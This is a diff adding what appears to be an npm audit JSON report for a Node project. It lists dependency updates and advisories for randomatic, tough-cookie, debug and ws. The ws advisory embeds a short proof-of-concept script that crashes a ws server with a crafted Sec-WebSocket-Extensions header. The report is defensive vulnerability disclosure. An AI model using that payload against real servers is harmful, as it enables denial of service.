@@ -1,0 +1,310 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "module": "tough-cookie",
+      "depth": 6,
+      "target": "2.3.4",
+      "resolves": [
+        {
+          "id": 525,
+          "path": "@npm/spife>chokidar>fsevents>node-pre-gyp>request>tough-cookie",
+          "dev": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "update",
+      "module": "debug",
+      "depth": 6,
+      "target": "2.6.9",
+      "resolves": [
+        {
+          "id": 534,
+          "path": "standard>eslint>debug",
+          "dev": true,
+          "optional": false
+        },
+        {
+          "id": 534,
+          "path": "standard>eslint-plugin-import>debug",
+          "dev": true,
+          "optional": false
+        },
+        {
+          "id": 534,
+          "path": "standard>eslint-plugin-import>eslint-import-resolver-node>debug",
+          "dev": true,
+          "optional": false
+        },
+        {
+          "id": 534,
+          "path": "tap>tap-mocha-reporter>debug",
+          "dev": true,
+          "optional": false
+        },
+        {
+          "id": 534,
+          "path": "@npm/spife>chokidar>fsevents>node-pre-gyp>tar-pack>debug",
+          "dev": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "update",
+      "module": "tunnel-ssh",
+      "depth": 2,
+      "target": "4.1.4",
+      "resolves": [
+        {
+          "id": 534,
+          "path": "db-migrate>tunnel-ssh>debug",
+          "dev": true,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "update",
+      "module": "test-exclude",
+      "depth": 3,
+      "target": "4.2.1",
+      "resolves": [
+        {
+          "id": 157,
+          "path": "tap>nyc>test-exclude>micromatch>braces>expand-range>fill-range>randomatic",
+          "dev": true,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "ws",
+      "resolves": [
+        {
+          "id": 550,
+          "path": "@npm/spife>numbat-emitter>ws",
+          "dev": false,
+          "optional": false
+        },
+        {
+          "id": 550,
+          "path": "@npm/spife>numbat-process>numbat-emitter>ws",
+          "dev": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "randomatic",
+      "resolves": [
+        {
+          "id": 157,
+          "path": "@npm/spife>chokidar>anymatch>micromatch>braces>expand-range>fill-range>randomatic",
+          "dev": false,
+          "optional": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "157": {
+      "findings": [
+        {
+          "version": "1.1.7",
+          "paths": [
+            "tap>nyc>micromatch>braces>expand-range>fill-range>randomatic",
+            "tap>nyc>test-exclude>micromatch>braces>expand-range>fill-range>randomatic"
+          ],
+          "dev": true,
+          "optional": false
+        },
+        {
+          "version": "1.1.7",
+          "paths": [
+            "@npm/spife>chokidar>anymatch>micromatch>braces>expand-range>fill-range>randomatic"
+          ],
+          "dev": false,
+          "optional": false
+        }
+      ],
+      "id": 157,
+      "created": "2016-11-09T20:03:19.000Z",
+      "updated": "2018-03-02T23:21:42.009Z",
+      "deleted": null,
+      "title": "Cryptographically Weak PRNG",
+      "found_by": {
+        "name": "Sven Slootweg"
+      },
+      "reported_by": {
+        "name": "Sven Slootweg"
+      },
+      "module_name": "randomatic",
+      "cves": [
+        "CVE-2017-16028"
+      ],
+      "vulnerable_versions": "<3.0.0",
+      "patched_versions": ">=3.0.0",
+      "overview": "Affected versions of `randomatic` generate random values using a cryptographically weak psuedo-random number generator. This may result in predictable values instead of random values as intended.\r\n\r\n",
+      "recommendation": "Update to version 3.0.0 or later.\r\n",
+      "references": "[Commit #4a52695](https://github.com/jonschlinkert/randomatic/commit/4a526959b3a246ae8e4a82f9c182180907227fe1#diff-b9cfc7f2cdf78a7f4b91a753d10865a2)",
+      "access": "public",
+      "severity": "high",
+      "cwe": "CWE-330",
+      "metadata": {
+        "module_type": "Multi.Library",
+        "exploitability": 5,
+        "affected_components": ""
+      }
+    },
+    "525": {
+      "findings": [
+        {
+          "version": "2.3.2",
+          "paths": [
+            "@npm/spife>chokidar>fsevents>node-pre-gyp>request>tough-cookie"
+          ],
+          "dev": false,
+          "optional": false
+        }
+      ],
+      "id": 525,
+      "created": "2017-09-08T18:07:02.061Z",
+      "updated": "2017-09-22T16:26:08.422Z",
+      "deleted": null,
+      "title": "Regular Expression Denial of Service",
+      "found_by": {
+        "name": "Cristian-Alexandru Staicu"
+      },
+      "reported_by": {
+        "name": "Cristian-Alexandru Staicu"
+      },
+      "module_name": "tough-cookie",
+      "cves": [
+        "CVE-2017-16112"
+      ],
+      "vulnerable_versions": "<2.3.3",
+      "patched_versions": ">=2.3.3",
+      "overview": "The tough-cookie module is vulnerable to regular expression denial of service. Input of around 50k characters is required for a slow down of around 2 seconds.\n\nUnless node was compiled using the -DHTTP_MAX_HEADER_SIZE= option the default header max length is 80kb so the impact of the ReDoS is limited to around 7.3 seconds of blocking.\n\nAt the time of writing all version <=2.3.2 are vulnerable",
+      "recommendation": "Please update to version 2.3.3 or greater",
+      "references": "- https://github.com/salesforce/tough-cookie/issues/92",
+      "access": "public",
+      "severity": "high",
+      "cwe": "CWE-400",
+      "metadata": {
+        "module_type": "",
+        "exploitability": 5,
+        "affected_components": ""
+      }
+    },
+    "534": {
+      "findings": [
+        {
+          "version": "2.6.0",
+          "paths": [
+            "db-migrate>tunnel-ssh>debug",
+            "standard>eslint>debug",
+            "standard>eslint-plugin-import>debug",
+            "standard>eslint-plugin-import>eslint-import-resolver-node>debug",
+            "tap>tap-mocha-reporter>debug"
+          ],
+          "dev": true,
+          "optional": false
+        },
+        {
+          "version": "2.6.8",
+          "paths": [
+            "@npm/spife>chokidar>fsevents>node-pre-gyp>tar-pack>debug"
+          ],
+          "dev": false,
+          "optional": false
+        }
+      ],
+      "id": 534,
+      "created": "2017-09-25T18:55:55.956Z",
+      "updated": "2017-09-27T18:24:24.491Z",
+      "deleted": null,
+      "title": "Regular Expression Denial of Service",
+      "found_by": {
+        "name": "Cristian-Alexandru Staicu"
+      },
+      "reported_by": {
+        "name": "Cristian-Alexandru Staicu"
+      },
+      "module_name": "debug",
+      "cves": [
+        "CVE-2017-16137"
+      ],
+      "vulnerable_versions": "<= 2.6.8 || >= 3.0.0 <= 3.0.1",
+      "patched_versions": ">= 2.6.9 < 3.0.0 || >= 3.1.0",
+      "overview": "The debug module is vulnerable to regular expression denial of service when untrusted user input is passed into the `o` formatter. It takes around 50k characters to block for 2 seconds making this a low severity issue.",
+      "recommendation": "Upgrade to version 2.6.9 or greater if you are on the 2.6.x series or 3.1.0 or greater.",
+      "references": "- https://github.com/visionmedia/debug/issues/501\n- https://github.com/visionmedia/debug/pull/504",
+      "access": "public",
+      "severity": "high",
+      "cwe": "CWE-400",
+      "metadata": {
+        "module_type": "",
+        "exploitability": 5,
+        "affected_components": ""
+      }
+    },
+    "550": {
+      "findings": [
+        {
+          "version": "3.1.0",
+          "paths": [
+            "@npm/spife>numbat-emitter>ws",
+            "@npm/spife>numbat-process>numbat-emitter>ws"
+          ],
+          "dev": false,
+          "optional": false
+        }
+      ],
+      "id": 550,
+      "created": "2017-11-08T19:25:17.211Z",
+      "updated": "2017-11-10T17:26:26.645Z",
+      "deleted": null,
+      "title": "Denial of Service",
+      "found_by": {
+        "name": "Nick Starke, Ryan Knell"
+      },
+      "reported_by": {
+        "name": "Nick Starke, Ryan Knell"
+      },
+      "module_name": "ws",
+      "cves": null,
+      "vulnerable_versions": "<=99.999.99999",
+      "patched_versions": "< 0.0.0",
+      "overview": "A specially crafted value of the `Sec-WebSocket-Extensions` header that used `Object.prototype` property names as extension or parameter names could be used to make a ws server crash.\n\nProof of concept:\n\n```\nconst WebSocket = require('ws');\nconst net = require('net');\n\nconst wss = new WebSocket.Server({ port: 3000 }, function () {\n  const payload = 'constructor';  // or ',;constructor'\n\n  const request = [\n    'GET / HTTP/1.1',\n    'Connection: Upgrade',\n    'Sec-WebSocket-Key: test',\n    'Sec-WebSocket-Version: 8',\n    `Sec-WebSocket-Extensions: ${payload}`,\n    'Upgrade: websocket',\n    '\\r\\n'\n  ].join('\\r\\n');\n\n  const socket = net.connect(3000, function () {\n    socket.resume();\n    socket.write(request);\n  });\n});\n```",
+      "recommendation": "Upgrade to version 3.3.1 or greater",
+      "references": "- https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a\n- https://github.com/websockets/ws/releases/tag/3.3.1",
+      "access": "public",
+      "severity": "high",
+      "cwe": "CWE-20",
+      "metadata": {
+        "module_type": "",
+        "exploitability": 5,
+        "affected_components": ""
+      }
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 0,
+      "high": 12,
+      "critical": 0
+    },
+    "dependencies": 375,
+    "devDependencies": 466,
+    "optionalDependencies": 87,
+    "totalDependencies": 918
+  }
+}
